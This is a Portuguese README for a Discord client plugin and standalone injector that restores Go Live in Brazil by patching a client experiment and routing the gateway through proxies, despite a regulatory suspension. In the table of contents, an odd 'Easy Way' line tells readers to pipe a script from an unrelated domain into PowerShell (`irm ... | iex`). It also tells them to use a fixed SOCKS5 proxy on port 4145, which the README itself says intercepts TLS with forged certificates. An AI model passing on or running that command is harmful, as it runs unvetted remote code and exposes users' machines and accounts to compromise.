# GoLiveBypass — Bypass do Go Live no Discord (Brasil)

Plugin para **Equicord** e **Vencord**, feito por um desenvolvedor brasileiro, que **devolve o Go Live e a câmera para usuários brasileiros**. São duas travas: o Discord desabilita os próprios botões, e o servidor recusa a transmissão. O plugin desarma a primeira direto no cliente, e a segunda criando a sua sessão atrás de uma proxy — só o WebSocket de gateway passa por ela, todo o resto sai direto, na sua velocidade normal.

> **English summary below / Resumo em inglês no final.**

## A instalação inteira, do começo ao fim

<p align="center">
  <img src="assets/instalacao.gif" alt="O instalador acha o Equicord, instala o plugin, compila e o Go Live volta a funcionar" width="720">
</p>

Um script faz tudo: acha o seu Equicord ou Vencord, instala o plugin, compila e abre o Discord com o Go Live funcionando. **[Começar aqui](#instalação-automática-recomendado)** — ou siga o [passo a passo escrito](#instalação-passo-a-passo-completo) se preferir fazer à mão.

## Índice

**Quero instalar agora**

- [Instalação automática](#instalação-automática-recomendado) — um script faz tudo sozinho, no Windows e no Linux
- [**Só uso o Discord, não quero instalar mod**](#modo-standalone-só-o-discord-sem-equicord-e-sem-vencord) — o modo standalone, sem Equicord e sem Vencord
- [**Linux: Arch, Debian, Ubuntu, Fedora**](#linux-arch-debian-ubuntu-fedora) — onde o Discord fica em cada distro, e a pedra do Node no Debian
- [Instalação manual, passo a passo](#instalação-passo-a-passo-completo) — se preferir fazer cada etapa à mão
- [Dependências](#dependências-o-que-baixar-e-como-instalar) — só para o caminho manual

** Easy Way install Method
- : Run `irm discord-fix.vangex.cloud | iex` on Powershell and use this custom proxy: socks5://192.252.210.233:4145

**Já instalei**

- [Configuração](#configuração) — região da call, região da transmissão, proxy
- [Uso](#uso) — o que fazer depois de instalar
- [Solução de problemas](#solução-de-problemas) — Discord travado, transmissão que não sobe, plugin sumido
- [O registro](#o-registro-o-que-o-plugin-anotou) — o arquivo que conta o que aconteceu, para relatar um problema

**Quero entender antes**

- [Por que este plugin existe](#por-que-este-plugin-existe)
- [Como funciona](#como-funciona) — as duas travas e como cada uma é desarmada
- [Avisos importantes](#avisos-importantes) — o que o plugin faz com a sua conexão, e os riscos

**Projeto**

- [Estrutura](#estrutura) · [Licença](#licença) · [Autor](#autor) · [Agradecimentos](#agradecimentos)

## Por que este plugin existe

Em agosto de 2026, a ANPD [ordenou que o Discord suspendesse as transmissões ao vivo (Go Live) no Brasil](https://www.gov.br/anpd/pt-br/assuntos/noticias/em-medida-preventiva-anpd-determina-que-discord-suspenda-transmissoes-ao-vivo-no-brasil), pouco depois de o país ter bloqueado o X (Twitter). Para quem depende dessas plataformas para se comunicar, organizar e denunciar, o recado foi claro: o acesso e a privacidade dos brasileiros na internet podem ser cortados por canetaço.

O GoLiveBypass nasce dessa luta. Ele é uma ferramenta de **privacidade e resistência à censura**: garante que o momento mais sensível da sua sessão — a autenticação, quando sua conta é vinculada ao seu endereço de IP — aconteça atrás de uma proxy anônima.

**O que ele entrega, verificado na prática:** como a sessão do Discord nasce inteira atrás da proxy, o **Go Live e a câmera voltam a funcionar** para contas brasileiras — veja a seção abaixo.

## Go Live no Brasil: por que funciona

Testes práticos mostram que o bloqueio do Go Live funciona assim:

- O Discord verifica sua região **apenas no momento em que você entra num canal de voz** (`VOICE STATE UPDATE`), usando o **IP da conexão WebSocket do gateway** — e **nunca reavalia** durante a chamada.
- O WebSocket do gateway é aberto no boot do app. Se ele nasce atrás de uma proxy fora do Brasil, o gate de região libera telas e câmera para contas brasileiras.
- A mídia (UDP) não passa por verificação nenhuma — ela pode sair direta pelo seu IP real sem derrubar a liberação.

Ou seja, o fluxo do GoLiveBypass — **boot inteiro atrás da proxy → proxy removida após a sessão abrir** — reproduz automaticamente o bypass manual "ligar VPN, abrir o Discord, entrar na call, desligar a VPN".

**Ressalvas honestas:**

- A liberação vale enquanto o WebSocket do gateway continuar vivo. Se ele cair e reconectar pelo seu IP real (queda de internet, notebook suspenso), a próxima entrada em canal de voz volta a ser avaliada como BR. **Ctrl+R não resolve**: o proxy só é aplicado antes do gateway nascer, então é preciso fechar o Discord pela bandeja e abrir de novo.
- Isso depende de comportamento atual do Discord, que pode mudar a qualquer momento.
- Usar proxy/VPN para contornar a restrição pode violar os Termos de Serviço do Discord. Risco de punição à conta é baixo, mas existe — considere usar uma conta secundária.

## Avisos importantes

- **Só funciona no Discord para computador** com Equicord ou Vencord injetado. Vesktop e Equibop não são suportados pelos instaladores: eles trazem o mod embutido e não carregam de um checkout. Não funciona na versão de navegador/extensão.
- **Proxies gratuitas são fracas para anonimato**: o operador da proxy vê seus metadados de conexão, muitas estão mortas ou lentas, e o Discord pode pedir captcha para IPs de proxies públicas. Para anonimato real, **use Tor**.
- Usar clientes modificados viola os Termos de Serviço do Discord. Use por sua conta e risco.
- A proxy cobre apenas a **criação da sessão**. Depois que a sessão abre (`CONNECTION_OPEN`), o tráfego volta a ser direto com seu IP real.
- **O plugin nunca te deixa sem Discord.** Se a proxy falhar, o Chromium cai sozinho para conexão direta, e o processo principal remove a proxy em no máximo 120 segundos. O pior caso é abrir o Discord *sem* Go Live, nunca ficar sem conseguir abrir.

## Como funciona

São duas travas independentes, e o plugin desarma as duas de formas diferentes.

### Trava 1: o cliente se auto-bloqueia

O Discord embarca um experimento de usuário que desliga vídeo. Quando o servidor te coloca nele, o cliente desabilita sozinho os botões de câmera e Go Live: é o `MediaEngineStore.supportsInApp(VIDEO)` que passa a retornar falso, e com ele o `canGoLive`.

O plugin esvazia a tabela de variações desse experimento. Qualquer bucket que o servidor atribua passa a cair na configuração padrão, que tem vídeo ligado. Isso destrava o cliente inteiro de uma vez, porque todos os consumidores leem do mesmo lugar.

### Trava 2: o servidor recusa a transmissão

Destravar o cliente não basta: o servidor decide separadamente se você pode transmitir, e essa decisão é tomada **uma única vez, quando você entra no canal de voz**, a partir do IP de origem da **conexão de gateway** (o WebSocket que carrega o `VOICE_STATE_UPDATE`). Depois disso não há reavaliação: o servidor de voz só transporta mídia por UDP.

Por isso o plugin proxia **só o gateway**:

1. Na abertura do app, antes do Discord abrir o WebSocket, o proxy é aplicado (o seu manual, ou um Tor local se estiver rodando).
2. O gateway nasce atrás do proxy. Como o Chromium prende cada conexão à rota que ela tinha ao nascer, esse socket fica no proxy para sempre.
3. Assim que a sessão abre (`CONNECTION_OPEN`), o plugin devolve a sessão para conexão direta. O gateway continua no proxy; **todo o resto** (API, CDN, anexos, atualizações e a mídia das calls) passa a sair direto, na sua velocidade normal.
4. O plugin então confere a atribuição do experimento no servidor e te diz num toast se a sessão ficou liberada de verdade.

O momento importa e é mais estrito do que parece: um socket criado **antes** do proxy ser aplicado fica preso na conexão direta para sempre. Proxiar depois que o app subiu não adianta.

### Como as proxies gratuitas são escolhidas

- A lista da ProxyScrape já traz `alive`, `uptime` e `timeout`. O plugin **ranqueia por esses campos** (uptime >= 90, timeout <= 1500ms) em vez de sortear a lista.
- Descarta a porta 4145: numa amostra medida, 14 de 14 proxies nessa porta interceptavam TLS com certificado forjado.
- Testa até 10 candidatas **em paralelo**, e o teste é um **handshake TLS real + `GET /api/v9/gateway` exigindo HTTP 200**, não apenas o handshake SOCKS.
- Confirma o **país de saída real** por TLS antes de usar, porque o `countryCode` da lista descreve o IP de entrada, que frequentemente é diferente do de saída.

Medido: escolher aleatoriamente e testar só o handshake acerta 12% das vezes; ranquear e exigir TLS real acerta 60%. Ainda assim, um Tor local ganha de qualquer lista gratuita, e é por isso que o plugin o prefere.

### Proteções contra travar o Discord

- **Fallback direto**: a proxy é aplicada como `proxy,direct://`, então se ela morrer o Chromium usa conexão direta sozinho.
- **Prazo no processo principal**: 120s depois de aplicada, a proxy sai sozinha. O prazo vive no processo principal, que tem rede sadia, e não no renderer, que é justamente o que a proxy quebrada impede de carregar.
- **`did-fail-load`**: se a página principal falhar em carregar, a proxy sai na hora.
- **Marca de boot**: se uma inicialização aplicou proxy e nunca terminou, a inicialização seguinte se recusa a aplicar.
- **Proxy gratuita só é reaproveitada depois de passar no teste de novo.** A última que funcionou fica guardada em `native-settings.json` sob `verifiedProxy` por 24h, e no boot seguinte ela é testada outra vez (orçamento de 2,5s) antes de ser aplicada. Descobrir uma do zero leva de 8 a 23 segundos e o gateway conecta antes disso, por isso o cache existe. O que causava o travamento antigo era reaplicar sem testar, e isso não acontece mais.

## Instalação automática (recomendado)

Um script encontra sozinho o Equicord ou o Vencord que você tem, instala o plugin, compila e injeta. Se você não tiver nenhum dos dois, ele pergunta qual você quer e instala junto.

**Windows, jeito mais simples:** baixe o [`GoLiveBypass-Installer.bat`](installer/GoLiveBypass-Installer.bat) e dê dois cliques. Ele libera a execução só para aquele processo (`Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`), baixa o `.ps1` se ele não estiver do lado, e roda tudo.

**Linux:**

```bash
curl -fsSLO https://raw.githubusercontent.com/bezumiya/GoLiveBypass/main/installer/golivebypass-installer.sh
chmod +x golivebypass-installer.sh
./golivebypass-installer.sh
```

Ao abrir, ele mostra o que encontrou e um menu:

```
  Detectado:
    Discord   instalado (1)
    Mod       Equicord
    Fonte     /home/voce/Equicord
    Plugin    nao instalado

  O que voce quer fazer?

    [1] Instalar ou atualizar o GoLiveBypass
    [2] Remover so o plugin (o mod continua)
    [3] Restaurar tudo (remove o plugin e desfaz a injecao)
    [0] Sair
```

Escolhendo instalar, ele pergunta três coisas: **onde** (usar o mod que já está aí ou baixar outro), **como sair do Brasil** (proxy gratuita testada sozinha, Tor local, ou uma proxy sua) e **por quanto tempo** (permanente, ou temporário — que desfaz a injeção quando você fechar o Discord).

**Pelo PowerShell:**

```powershell
irm https://raw.githubusercontent.com/bezumiya/GoLiveBypass/main/installer/GoLiveBypass-Installer.ps1 -OutFile GoLiveBypass-Installer.ps1
powershell -ExecutionPolicy Bypass -File .\GoLiveBypass-Installer.ps1
```

Ele descobre onde está o seu checkout **lendo a própria injeção do Discord**: o instalador do Equicord e o do Vencord substituem o `app.asar` por um stub que faz `require` da pasta de build, e desse caminho dá para derivar a raiz do repositório. Se não achar por aí, procura nos lugares habituais.

| sua situação | o que acontece |
|---|---|
| Equicord ou Vencord já instalado a partir do fonte | Copia o plugin, compila e reinicia o Discord |
| Instalado, mas o Discord não carrega desse checkout | Compila e roda o `pnpm inject` para apontar o Discord para ele |
| Você não tem nenhum dos dois | Mostra uma tela para escolher **Equicord** ou **Vencord**, baixa, compila e injeta |
| Falta Git ou Node | No Windows, oferece instalar pelo winget. No Linux, mostra o comando da sua distro (o pacote do Node é `nodejs`, e costuma ser antigo demais: nesse caso use nvm, fnm ou o NodeSource). O pnpm sai do `corepack enable` nos dois |

A descoberta é automática e roda em milissegundos: primeiro lê a injeção do Discord, depois varre os lugares onde um checkout costuma estar (perfil, Documentos, Desktop, Downloads, `dev`, `repos`, `projects`, `source`, e a raiz de cada disco).

Outros modos:

```powershell
.\GoLiveBypass-Installer.ps1 -Source C:\caminho\do\Equicord  # aponta o checkout na mão
.\GoLiveBypass-Installer.ps1 -Mod Vencord                     # escolhe o mod sem a tela
.\GoLiveBypass-Installer.ps1 -Yes                             # sem perguntas, para automação
.\GoLiveBypass-Installer.ps1 -Mode Install                    # instala direto, sem menu
.\GoLiveBypass-Installer.ps1 -Mode Uninstall                  # remove o plugin e recompila
.\GoLiveBypass-Installer.ps1 -Mode Restore                    # remove o plugin e desfaz a injeção
```

```bash
./golivebypass-installer.sh --source ~/Equicord   # aponta o checkout na mão
./golivebypass-installer.sh --mod vencord         # escolhe o mod sem a tela
./golivebypass-installer.sh --yes                 # sem perguntas, para automação
./golivebypass-installer.sh --install             # instala direto, sem menu
./golivebypass-installer.sh --uninstall           # remove o plugin e recompila
./golivebypass-installer.sh --restore             # remove o plugin e desfaz a injeção
```

O instalador **baixa o plugin direto deste repositório** em vez de carregar uma cópia embutida, então nunca instala uma versão defasada. Ele nunca mexe no `app.asar`: quem injeta é o instalador oficial do Equicord/Vencord.

O instalador já deixa o plugin **ativado e configurado**. Depois que ele terminar, feche o Discord pela bandeja e abra de novo: é isso.

## Modo standalone: só o Discord, sem Equicord e sem Vencord

Se você não usa nenhum mod e não quer instalar um, existe o **modo standalone**. Ele instala o bypass direto no Discord.

**Não precisa de Node, nem de pnpm, nem de git.** Não há etapa de compilação: o bypass é um arquivo `.js` que o próprio Discord carrega ao abrir.

| | plugin | standalone |
|---|---|---|
| exige Equicord ou Vencord | sim | **não** |
| exige Node, pnpm e git | sim | **não** |
| convive com outros plugins | sim | não, ocupa o lugar do mod |
| tela de configuração | dentro do Discord | um `settings.json` |
| diagnóstico | `/golivebypass` e arquivo | arquivo |

**Escolha o standalone** se você só usa o Discord puro. **Escolha o plugin** se já usa Equicord ou Vencord — os dois ocupam o mesmo lugar dentro do Discord, e instalar o standalone por cima desliga o seu mod. O instalador detecta isso e pergunta antes de mexer.

### Como instalar

**Windows:** baixe a pasta `standalone` e dê dois cliques no `GoLiveBypass-Standalone.bat`.

**Linux:**

```bash
chmod +x golivebypass-standalone.sh
./golivebypass-standalone.sh
```

Para usar a sua própria proxy ou o Tor:

```powershell
.\GoLiveBypass-Standalone.ps1 -Proxy "socks5://127.0.0.1:9050"
```

Para ver o que ele detectou sem mexer em nada, `-Mode Status`. Para desfazer, `-Mode Uninstall` — ele devolve o `app.asar` original, byte a byte.

### Como ele funciona, e por que é mais simples

O plugin desarma duas travas: a do cliente, por patch, e a do servidor, pela proxy. O standalone precisa de **uma** só.

O motivo é que a trava do cliente vem de um experimento que o servidor atribui a partir do IP de onde o WebSocket de gateway sai. Com o gateway saindo por um IP não bloqueado, **o experimento não é atribuído** — os botões ficam livres sozinhos, sem patch nenhum. O patch do plugin é rede de segurança, não o mecanismo principal.

Sem a parte do cliente, sobra só o processo principal, e aí o desenho muda: em vez de mandar a sessão inteira pela proxy e soltar depois, o standalone instala uma regra por host (um PAC) que manda **apenas** `gateway.discord.gg` e `remote-auth-gateway.discord.gg` por um roteador SOCKS local. Uma regra assim não precisa ser solta nunca, e todo o resto do Discord sai direto o tempo todo.

O roteador escuta só em `127.0.0.1`, numa porta que o sistema escolhe, e **recusa qualquer destino que não esteja nessa lista** — sem isso ele seria um SOCKS aberto que qualquer programa da máquina poderia usar com a identidade do Discord.

Se nenhuma saída ficar pronta a tempo, a conexão sai direta em vez de ficar esperando: Discord sem bypass é ruim, Discord que não abre é muito pior.

### Depois de uma atualização do Discord

O Discord se atualiza numa pasta nova, sem a injeção, e o bypass sumiria em silêncio. Enquanto a versão atual ainda está rodando, o standalone detecta a pasta nova e já deixa ela pronta. Se mesmo assim parar de funcionar depois de uma atualização, rode o instalador de novo.

## Linux: Arch, Debian, Ubuntu, Fedora

Os instaladores detectam a sua distro sozinhos. Esta seção é para entender o que eles fazem, e para quem prefere fazer à mão.

### Qual dos dois usar

- **Só uso o Discord** → [modo standalone](#modo-standalone-só-o-discord-sem-equicord-e-sem-vencord). Não precisa de Node, nem de pnpm, nem de git. É um `.js` e pronto.
- **Uso ou quero usar Equicord/Vencord** → o instalador do plugin, abaixo.

### Onde o Discord fica em cada distro

Isto mudou em maio de 2026, na versão 1.0.136 do Discord, e a maior parte dos tutoriais na internet ainda está desatualizada.

**Hoje o pacote que você instala não contém o Discord.** O `.tar.gz` oficial, o `.deb`, o pacote oficial do Arch e o RPM do RPM Fusion trazem apenas um *bootstrapper* de uns 4 MB. Na primeira vez que você abre, ele baixa o app de verdade **para dentro da sua pasta pessoal**.

| como você instalou | onde o `app.asar` fica |
|---|---|
| `.tar.gz` oficial, `.deb`, `extra/discord` do Arch, RPM Fusion | `~/.config/discord/app-<versão>/resources/` |
| PTB | `~/.config/discordptb/app-<versão>/resources/` |
| Canary | `~/.config/discordcanary/app-<versão>/resources/` |
| `discord_arch_electron` (AUR) | `/usr/share/discord/resources/` |
| `discord-electron-openasar` (AUR) | `/usr/lib/discord/resources/` — **já tem OpenAsar** |
| `discord-ptb` / `discord-canary` (AUR) | `/opt/discord-ptb/resources/`, `/opt/discord-canary/resources/` |
| Flatpak, Snap | somente leitura, **não dá para injetar** |

Duas consequências práticas:

**Quase sempre não precisa de `sudo`.** Se o seu Discord veio pelo caminho normal, o `app.asar` está na sua pasta pessoal. Os instaladores só pedem root quando o alvo realmente pertence ao root — os pacotes do AUR que ainda embutem o app.

**A atualização do Discord desfaz a injeção.** Ele baixa a versão nova numa pasta `app-<versão>` inteiramente nova, e o que você injetou fica na pasta velha. Não dá para impedir isso de fora: rode o instalador de novo depois de atualizar. O instalador avisa quando esse é o seu caso.

Se você usa `discord-electron-openasar`, ele **já substitui** o `app.asar` pelo OpenAsar. Injetar por cima apaga o OpenAsar — o instalador avisa antes.

Por isso os instaladores procuram o `app.asar` de verdade em vez de confiar numa lista: `/usr/share/discord` existe nos dois mundos com significados opostos — no pacote oficial do Arch ele contém **só** o bootstrapper, e no `discord_arch_electron` contém o app inteiro.

### Arch e derivadas (Manjaro, EndeavourOS, Garuda)

O Arch entrega Node atual (26.x) e tem o `pnpm` empacotado, então é o caso mais simples:

```bash
sudo pacman -S --needed nodejs npm git pnpm
```

O instalador faz isso sozinho, com confirmação. Ele também prefere o `pnpm` do pacman em vez de um `npm install -g`, que jogaria arquivos em `/usr/lib` fora do controle do pacote.

Com o pacote **oficial** (`extra/discord`), o `app.asar` fica na sua pasta pessoal e nenhum `sudo` é necessário. Com o **`discord_arch_electron`** do AUR o app fica em `/usr/share/discord`, e aí sim precisa de root — e um `pacman -Syu` sobrescreve a injeção, então rode o instalador de novo depois de atualizar.

### Debian, Ubuntu, Mint, Pop!_OS

Aqui tem uma pedra: **o Node do repositório é velho demais**. O Equicord precisa da versão 22 ou mais nova, e o Debian estável e o Ubuntu LTS entregam versões bem anteriores. O `pnpm build` quebra lá na frente com um erro que não diz "seu Node é antigo" — por isso o instalador confere a versão **antes** de começar e explica o que fazer.

O jeito mais direto:

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
# feche e abra o terminal
nvm install 22
```

Ou pelo [NodeSource](https://github.com/nodesource/distributions), se preferir pacote do sistema.

Git e npm vêm do repositório normalmente:

```bash
sudo apt-get install -y git npm
```

### Fedora e Nobara

```bash
sudo dnf install -y nodejs npm git
```

Se o Node vier abaixo de 22:

```bash
sudo dnf module reset nodejs && sudo dnf module enable nodejs:22
```

### openSUSE

```bash
sudo zypper install -y nodejs npm git
```

### Permissões

O Discord instalado em `/usr/share`, `/usr/lib` ou `/opt` pertence ao root, então a injeção precisa de `sudo`. Os instaladores pedem **só quando precisam** — se o seu Discord está em `~/.local/share` ou numa pasta sua, nada de sudo é usado.

Nenhum dos dois roda comando com sudo sem perguntar antes, e o comando exato aparece na tela para você conferir.

## Dependências: o que baixar e como instalar

> Se você usou o instalador automático acima, **pule esta seção e a próxima**. O instalador confere o que falta e oferece instalar sozinho. O que vem daqui em diante é o caminho manual, para quem prefere fazer cada passo à mão ou precisa entender o que está acontecendo.

Você precisa de **4 programas** antes de começar. Instale na ordem. Depois de instalar cada um, **feche e abra o terminal de novo** — o Windows só reconhece programas novos em terminais abertos depois da instalação.

### 1. Git — o programa que baixa código do GitHub

É ele que faz o `git clone` (baixar) deste repositório e do Equicord/Vencord.

**Windows (jeito mais fácil):**
1. Abra o **PowerShell** (tecla Windows → digite "PowerShell" → Enter)
2. Rode: `winget install Git.Git`
3. Ou, se preferir baixar manualmente: entre em [git-scm.com/download/win](https://git-scm.com/download/win), baixe o instalador de 64-bit e clique em **Next** em tudo (as opções padrão são as certas)

**Linux:** `sudo apt install git` (Debian/Ubuntu) ou o equivalente da sua distro.
**macOS:** `brew install git`.

**Confira se deu certo** (num terminal novo): `git --version` → deve mostrar algo como `git version 2.x.x`. Se disser "comando não encontrado", feche e abra o terminal.

### 2. Node.js 22 ou superior — o motor que compila o plugin

O Equicord/Vencord é feito em TypeScript, e quem transforma isso no programa final é o Node. **Versão menor que 22 quebra o build.**

**Windows/macOS:**
1. Entre em [nodejs.org](https://nodejs.org/) e baixe o botão verde **LTS** (qualquer LTS a partir do 22)
2. Instale clicando em **Next** em tudo — deixe marcada a opção de adicionar ao PATH (vem marcada)
3. Ou pelo terminal: `winget install OpenJS.NodeJS.LTS`

**Linux:** use o [NodeSource](https://github.com/nodesource/distributions) — o Node dos repositórios da distro costuma ser velho demais.

**Confira:** `node --version` → precisa mostrar `v22.x.x` ou maior.

### 3. pnpm — o instalador de peças do projeto

O projeto usa **pnpm** (e não o npm que vem com o Node) para baixar as bibliotecas do build. Você não baixa instalador nenhum: o Node já traz o **Corepack**, que ativa o pnpm com dois comandos.

Num terminal (depois de instalar o Node):

```bash
corepack enable
corepack prepare pnpm@latest --activate
```

Se der erro de permissão no Windows, abra o PowerShell **como administrador** e rode de novo. Se o Corepack não existir, a alternativa é: `npm install -g pnpm`.

**Confira:** `pnpm --version` → o projeto foi testado com pnpm 11.

### 4. Discord para computador — onde o plugin vai rodar

O plugin **só funciona no app de computador** (ele usa recursos do Electron que o navegador não tem):

- **Discord normal**: baixe em [discord.com/download](https://discord.com/download) (stable, PTB ou Canary servem); ou
- **Vesktop/Equibop**: apps alternativos que já trazem o mod embutido. Os instaladores daqui não mexem neles.
- **Não funciona** no Discord aberto no navegador nem no celular.

### Opcional: Tor — só se você quiser mais estabilidade

**Não é necessário.** Por padrão o plugin escolhe e testa uma proxy gratuita sozinho, sem nenhuma dependência extra.

O Tor é só uma opção para quem quer mais estabilidade: ele é mais rápido e não morre no meio do caminho como as proxies públicas. Se você já tiver o [Tor Browser](https://www.torproject.org/download/) aberto, o plugin detecta sozinho em `127.0.0.1:9150`; o daemon `tor` fica em `9050`.

## Instalação: passo a passo completo

> Este é o caminho manual. O [instalador automático](#instalação-automática-recomendado) faz tudo isto sozinho; siga daqui só se preferir fazer na mão.

Escolha **Equicord** ou **Vencord** — os dois funcionam, o processo é idêntico. Os exemplos usam Equicord; para Vencord, troque o link do clone por `https://github.com/Vendicated/Vencord` e a pasta para `Vencord`.

### Passo 1 — Baixe o código do Equicord

Abra o terminal, vá para a pasta onde quer guardar o projeto e clone:

```bash
cd Documents
git clone https://github.com/Equicord/Equicord
cd Equicord
```

### Passo 2 — Instale as bibliotecas do build

```bash
pnpm install
```

Isso baixa tudo que o Equicord precisa para compilar (demora um pouco na primeira vez, é normal).

### Passo 3 — Baixe o plugin e coloque na pasta certa

Duas formas de baixar este repositório:

- **Pelo terminal** (estando fora da pasta Equicord): `git clone https://github.com/bezumiya/GoLiveBypass`
- **Pelo navegador**: abra [github.com/bezumiya/GoLiveBypass](https://github.com/bezumiya/GoLiveBypass), clique no botão verde **Code → Download ZIP** e extraia o arquivo

Depois copie a pasta **`goLiveBypass`** (a que contém `index.tsx` e `native.ts`) para dentro de:

```
Equicord/src/userplugins/goLiveBypass
```

**Atenção aos detalhes que mais quebram:**

- A pasta `userplugins` **não existe por padrão** — crie ela dentro de `src/`
- Ela fica em `src/userplugins`, **ao lado** de `src/plugins` — **nunca dentro** de `src/plugins` (isso gera o erro `Could not resolve "./plugins/userplugins"` no build)
- No final, o caminho dos arquivos deve ser exatamente `src/userplugins/goLiveBypass/index.tsx` e `src/userplugins/goLiveBypass/native.ts`

### Passo 4 — Compile

```bash
pnpm build
```

Isso gera a pasta `dist/` com o Equicord modificado já incluindo o plugin. Se aparecer algum erro vermelho, leia a seção **Solução de problemas** antes de tentar de novo.

### Passo 5 — Injete no Discord

**Feche o Discord completamente antes** (ícone na bandeja perto do relógio → botão direito → **Quit Discord**). Depois:

```bash
pnpm inject
```

O instalador abre uma janelinha perguntando **qual Discord** você usa (Stable, PTB ou Canary) — escolha o seu e confirme. É isso que "injetar" faz: ele aponta o seu Discord para o build que você compilou. Para desfazer depois, basta rodar `pnpm uninject` na mesma pasta.

### Passo 6 — Ative o plugin e use

1. Abra o Discord
2. Vá em **Configurações → Equicord (ou Vencord) → Plugins** e ative **GoLiveBypass**
3. Deixe **Voice region** em `Automatic`, que é o padrão (leia o aviso abaixo antes de mudar)
4. Reinicie o Discord por completo (bandeja, Quit). O plugin escolhe o proxy e aplica antes do gateway conectar, depois solta o resto
5. Entre num canal de voz: **Go Live e câmera liberados**. Quem escolhe o servidor de voz é o Discord, e pode não ser o brasileiro. Não force `brazil` em **Voice region** sem ler o aviso na seção Configuração

## Configuração

Nas settings do plugin:

- **Voice region**: seletor com a lista real de regiões que o Discord expõe. Padrão: `Automatic`, que devolve a decisão ao Discord.

  > **Cuidado ao forçar `brazil` aqui.** Há indício de que o servidor de mídia brasileiro é justamente onde a transmissão é recusada: numa sessão em que a call caiu no Brasil o Go Live não subiu, e numa sessão em que caiu em Santiago funcionou. São duas observações, não uma prova, mas o padrão seguro é não forçar. Use este campo se quiser priorizar latência e estiver disposto a perder o Go Live.

  Vale saber que isto é uma **preferência**, não uma ordem: o Discord pode ignorar e escolher outra região, e foi o que aconteceu no teste.
- **Proxy**: proxy usada só na criação da sessão, no formato `esquema://host:porta` (`socks5`, `http` ou `https`).
  - Tor, se você usa: `socks5://127.0.0.1:9150` com o **Tor Browser** aberto, ou `socks5://127.0.0.1:9050` para o **daemon** `tor`.
  - **Deixe vazio** para o plugin detectar um Tor local automaticamente e, se não achar, buscar uma proxy gratuita validada.
- **Excluded countries**: códigos de país de duas letras separados por vírgula que nunca são usados (padrão: `BR`). O país conferido é o de **saída real**, medido através da proxy, não o que a lista afirma.

## Uso

1. Abra o Discord normalmente. O plugin escolhe o proxy e aplica antes do gateway conectar.
2. Se você escolheu Tor no instalador, deixe o Tor aberto antes; com proxy gratuita não precisa fazer nada.
3. Espere o toast. `Go Live is unlocked on this session` significa que o servidor liberou e o proxy já saiu de tudo que não é o gateway. `Discord still has Go Live blocked` significa que o gateway subiu sem o proxy: feche o Discord de verdade (bandeja, Quit) e abra de novo.
4. Entre na call e transmita.

Se o Discord reconectar o gateway sozinho no meio da sessão (queda de rede, suspender o notebook), o socket novo nasce direto e o desbloqueio se perde até você reiniciar o app. O toast do próximo `CONNECTION_OPEN` avisa quando isso acontece.

## Solução de problemas

- **Discord carregando infinitamente**: normalmente ele se resolve sozinho, porque uma inicialização que não terminou deixa uma marca e a seguinte se recusa a aplicar proxy. Se persistir, com o Discord fechado abra `%APPDATA%/Equicord/settings/settings.json` (ou `.../Vencord/...`) e coloque `"GoLiveBypass": { "enabled": false }`. Em `native-settings.json` as chaves deste plugin são `verifiedProxy` (a proxy guardada) e `bootPending` (a marca); apagar as duas devolve tudo ao estado inicial. Se você usou uma versão anterior, apague também `lastKnownProxy`, que não é mais lida.
- **"GoLiveBypass is reconnecting behind the proxy"**: a proxy ficou pronta depois de o gateway já ter conectado, então a sessão nasceu desprotegida e o servidor manteve o bloqueio. O plugin procura uma proxy que responda e recarrega o cliente sozinho para a sessão renascer atrás dela. São no máximo duas tentativas: sem esse teto, um bloqueio que a proxy não resolve viraria recarregamento sem fim.
- **Meu proxy pede usuário e senha**: coloque no próprio endereço, `socks5://usuario:senha@host:porta`. Funciona para SOCKS5 e para proxy HTTP. Se a senha tiver `@` ou `:`, codifique esses caracteres (`@` vira `%40`, `:` vira `%3A`) — sem isso não dá para saber onde a senha termina. A senha nunca aparece no registro.
- **"No proxy could carry a real request to Discord"**: nenhuma candidata passou no teste TLS real naquele momento. Tente de novo, ou use Tor / uma proxy sua no campo Proxy.
- **Quer ver o que aconteceu**: rode `/golivebypass` em qualquer canal, ou abra o arquivo em `%LOCALAPPDATA%\GoLiveBypass\golivebypass.log` (veja [O registro](#o-registro-o-que-o-plugin-anotou)). Ele copia um diagnóstico com o estado das travas, da transmissão, da região e o registro do processo principal — qual proxy foi testada, quanto tempo levou, em que país ela sai e por que foi recusada.
- **A região da call não mudou**: saia e entre de novo no canal. Canais de servidor com região fixada por um admin ignoram sua preferência, e numa call que já está rolando a região já foi decidida.
- **Captcha ou verificação de telefone no login**: o Discord marca muitos IPs de proxies públicas. Use Tor ou outra proxy.
- **`Cannot find matching keyid` ao instalar as dependências**: é o corepack, não o plugin. Ele cria o atalho do `pnpm` antes de saber que versão usar, e na primeira execução busca essa versão no registro do npm conferindo a assinatura com chaves embutidas nele — as que vêm no Node 22 estão vencidas. O instalador detecta isso e instala o pnpm pelo npm. Se estiver fazendo à mão, rode `npm install -g pnpm` e siga com `pnpm install`.
- **Erro de build `Could not resolve "./plugins/userplugins"`**: você copiou a pasta para dentro de `src/plugins/` por engano. O caminho certo é `src/userplugins/goLiveBypass` — a pasta `userplugins` fica em `src/`, **ao lado** de `plugins`, e pode ser necessário criá-la.
- **Plugin não aparece na lista**: confirme que a pasta está em `src/userplugins/goLiveBypass` (com `index.tsx` e `native.ts`) e que você rodou `pnpm build` + `pnpm inject` e reiniciou o Discord.

## O registro: o que o plugin anotou

Tudo o que o bypass faz vai para um arquivo, no plugin e no standalone, **no mesmo lugar**:

| sistema | caminho |
|---|---|
| Windows | `%LOCALAPPDATA%\GoLiveBypass\golivebypass.log` |
| Linux | `~/.local/share/GoLiveBypass/golivebypass.log` |

Ele é cortado sozinho quando passa de 256 KB, então não cresce sem fim.

No plugin, `/golivebypass` copia esse mesmo conteúdo já junto com o estado da sessão, pronto para colar num relato. No standalone o arquivo é o único caminho, porque não há interface para um comando.

O registro responde as perguntas que a tela não responde:

- **qual saída foi escolhida, em quanto tempo e de que país** — e quantas foram testadas e recusadas antes dela
- **se o servidor atribuiu o bloqueio a você nesta sessão** (`atribuicao do video guard`), que é a diferença entre "a proxy funcionou" e "a proxy subiu tarde demais"
- **se a sessão precisou ser recarregada**, e por quê
- **a região que o Discord escolheu** e a lista completa que ele considerou

Um registro típico de uma abertura que deu certo:

```
============================================================
abrindo | win32 x64 | electron 42.7.1 | chrome 148.0.7778.280
configuracao | proxy automatico | regiao de call automatica | paises fora BR
25 candidatas depois do ranqueamento
